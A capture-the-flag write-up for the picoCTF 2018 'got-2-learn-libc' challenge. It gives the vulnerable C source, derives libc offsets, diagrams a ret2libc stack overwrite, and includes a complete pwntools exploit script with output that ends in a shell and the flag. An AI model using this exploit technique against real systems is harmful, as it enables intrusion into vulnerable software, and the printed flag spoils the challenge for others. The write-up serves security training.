# got-2-learn-libc
Binary Exploitation, 250 points

## Description:
> This program gives you the address of some system calls. Can you get a shell?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}

```

## Solution:

For this challenge it's important to know that:
* Given a number of libc runtime function addresses, it's possible to find the actual libc version used.
* Given a runtime address of a libc function, together with the address of the function symbol in the libc library, it's possible to calculate (through simple subtraction) the runtime address of the libc base.
* Given the address of the runtime libc base, and the libc version, it's possible to calculate the address of any runtime libc function or data.

This challenge serves everything we need on a silver platter.

### Step #1: Identify LibC Version

For this, we just need to run the program on the server and check the output:
```console
user@pico-2018-shell-3:/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f$ ./vuln
Here are some useful addresses:

puts: 0xf7664140
fflush 0xf7662330
read: 0xf76d9350
write: 0xf76d93c0
useful_string: 0x5661c030

Enter a string:
Test
Test
Thanks! Exiting now...
```

Now that we have several libc function addresses, it's possible to use an online service such as [libc database search](https://libc.blukat.me/?q=fflush%3A330%2Cread%3A350%2Cputs%3A140%2Cwrite%3A3c0&l=libc6-i386_2.23-0ubuntu10_amd64) or download locally the [libc-database](https://github.com/niklasb/libc-database) tool in order to locate the correct libc version:
```console
root@kali:~/utils/libc-database# ./find fflush 330 read 350 write 3c0 puts 140
ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
```

The remote version is libc6-i386_2.23-0ubuntu10_amd64.

Note that we've only entered the last 3 digits of the address, since usually anything more isn't needed.

Also note that when running the program locally, we get different addresses:
```console
root@kali:/media/sf_CTFs/pico/got-2-learn-libc# ./vuln
Here are some useful addresses:

puts: 0xf7dc0e30
fflush 0xf7dbefd0
read: 0xf7e3f130
write: 0xf7e3f200
useful_string: 0x5660f030

Enter a string:
Test
Test
Thanks! Exiting now...
```

We can use the same trick to find the local libc version, but calling `ldd` is easier:
```console
root@kali:/media/sf_CTFs/pico/got-2-learn-libc# ldd vuln
        linux-gate.so.1 (0xf7fb5000)
        libc.so.6 => /lib32/libc.so.6 (0xf7dbf000)
        /lib/ld-linux.so.2 (0xf7fb7000)
```

The local version is /lib32/libc.so.6.


### Step #2: Identify LibC Base

Now that we have the libc version and the runtime address of a libc function, we can identify the libc runtime base address by performing the following calculation:

libc_base = runtime_address_of_func - symbol_address_of_func.

In our case, we will take `read()` as an example.

We already have the runtime address from the program output (0xf76d9350), we can use libc-database to get the symbol address:
```console
root@kali:~/utils/libc-database# ./dump libc6-i386_2.23-0ubuntu10_amd64 read
offset_read = 0x000d4350
```

Therefore: 

libc_base = 0xf76d9350 - 0x000d4350 = 0xf7605000

It's usually a good sign that the result is 4K aligned.

Note: The addresses will change between runs due to ASLR.

### Step #3: Find system() Offset

Now that we have the runtime libc base address and version, we can perform the following calculation in order to get the runtime address of any libc function (or object):

requested_runtime_address = libc_base_address + libc_symbol_address.

For example, if we want to call `system()`, we first need to find the symbol address:
```console
root@kali:~/utils/libc-database# ./dump libc6-i386_2.23-0ubuntu10_amd64 system
offset_system = 0x0003a940
```

We then just calculate: 0xf7605000 + 0x0003a940 = 0xf763f940.

### Step #4: From Buffer Overflow to Shell

The buffer overflow here is very simple:
```c
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
```

`BUFSIZE` is defined as 148, so any input larger than that will overflow the buffer and allow us to take over the stack (and therefore the program execution flow).

We want to call `system()` with the following parameter, which will give us a shell:
```c
char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */
```

The offset of the string is also kindly printed by the program:
```
useful_string: 0x5661c030
```

The stack layout before the overflow is as follows:

```
+---------+
| old ebp | <-- ebp
+---------+
| ret     | <-- ebp + 0x4
+---------+
```

After the overflow, we will override it as follows:

```
+---------+
| AAAA    | <-- ebp
+---------+
| system  | <-- ebp + 0x4
+---------+
| BBBB    | <-- ebp + 0x8
+---------+
| &binsh  | <-- ebp + 0xc
+---------+
```

When the `vuln` function returns, it pops ebp and returns to (ebp + 0x4), which sends it to `system`.

The stack that `system` meets before the prolog is:

```
+---------+
| BBBB    | 
+---------+
| &binsh  | 
+---------+
```

It then performs the prolog (push ebp, mov ebp, esp) and gets:

```
+---------+
| old ebp | <-- ebp
+---------+
| BBBB    | <-- ebp + 0x4
+---------+
| &binsh  | <-- ebp + 0x8
+---------+
```

Which means that `system` will treat the address of "/bin/sh" as its argument, and give us a shell.


### Scripting with pwntools

Putting it all together:
```python
from pwn import *
import argparse
import os

EXECUTABLE = "vuln"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f/"
SSH_SERVER = "2018shell3.picoctf.com"

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
	os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")

	proc = process(get_process_path())
	payload = cyclic(200)
	proc.sendlineafter("Enter a string:", payload)
	proc.wait()
	offset = cyclic_find(proc.corefile.eip)
	log.info("Overflow offset: {}".format(offset))
	return offset


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username", required = True)
args = parser.parse_args()

offset = get_overflow_offset()
e = ELF(get_process_path())
context.binary = e.path
libc = ELF(LOCAL_PATH + "libc6-i386_2.23-0ubuntu10_amd64.so")

p = get_process(args.ssh_user)
output = p.recvuntil("Enter a string:")

binsh = int(re.search("useful_string: 0x([0-9a-f]+)", output, re.MULTILINE).group(1), 16)
log.info("Address of /bin/sh: {}".format(hex(binsh)))

addr_read = int(re.search("read: 0x([0-9a-f]+)", output, re.MULTILINE).group(1), 16)
log.info("Address of read(): {}".format(hex(addr_read)))

libc_base = addr_read - libc.symbols["read"]
log.info("libc base: {}".format(hex(libc_base)))

#Rebase libc
libc.address = libc_base

#Not needed since libc was rebased: system_addr = p32(libc_base + libc.symbols["system"])
system_addr = libc.symbols["system"]
log.info("Address of system(): {}".format(hex(libc.symbols["system"])))

r = ROP(libc)
r.system(binsh)

print r.dump()

payload = fit({offset: str(r)})

p.sendline(payload)
p.interactive()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/got-2-learn-libc# python exploit.py --ssh_user $pico_ssh_user
[+] Starting local process './vuln': pid 4036
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 4036)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/got-2-learn-libc/core.4036'
    Arch:      i386-32-little
    EIP:       0x62616170
    ESP:       0xff8a2090
    Exe:       '/media/sf_CTFs/pico/got-2-learn-libc/vuln' (0x565ce000)
    Fault:     0x62616170
[*] Overflow offset: 160
[*] '/media/sf_CTFs/pico/got-2-learn-libc/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/media/sf_CTFs/pico/got-2-learn-libc/libc6-i386_2.23-0ubuntu10_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f/vuln' on 2018shell3.picoctf.com: pid 543269
[*] Address of /bin/sh: 0x56640030
[*] Address of read(): 0xf7641350
[*] libc base: 0xf756d000
[*] Address of system(): 0xf75a7940
[*] Loaded cached gadgets for './libc6-i386_2.23-0ubuntu10_amd64.so'
0x0000:       0xf75a7940 system(0x56640030)
0x0004:           'baaa' <return address>
0x0008:       0x56640030 arg0
[*] Switching to interactive mode

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaab@yZbaaa0
Thanks! Exiting now...
$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{syc4al1s_4rE_uS3fUl_b61928e8}$ $ exit
[*] Got EOF while reading in interactive
$
[*] Stopped remote process 'vuln' on 2018shell3.picoctf.com (pid 543269)
[*] Got EOF while sending in interactive
root@kali:/media/sf_CTFs/pico/got-2-learn-libc#
```

The flag: picoCTF{syc4al1s_4rE_uS3fUl_b61928e8}